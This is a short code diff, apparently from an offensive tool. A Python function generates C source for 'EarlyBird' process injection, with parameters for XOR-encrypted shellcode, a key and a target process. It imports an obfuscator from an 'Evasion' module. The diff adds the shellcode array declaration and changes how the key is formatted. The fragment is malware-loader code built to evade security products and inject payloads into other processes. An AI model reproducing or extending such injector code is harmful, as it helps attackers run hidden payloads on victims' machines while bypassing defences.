@@ -5,10 +5,11 @@ from Evasion.Obfuscator import obfuscator
 
 def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,key_hex,encryption_type,array,size):
     EarlyBird_Injection=f"""
-
+    unsigned char {shellcode_var}[] = {ciphertext_split}
 
             if (!executed)
             {{
+                
                 
                 executed = TRUE;
 
@@ -19,7 +20,7 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,
                 
                 allocation_start = nullptr;
 
-                char {key_var}[] = "{key_hex}";
+                char {key_var}[] = {key_hex};
 
                 STARTUPINFOA si = {{ 0 }};
                 PROCESS_INFORMATION pi = {{ 0 }};
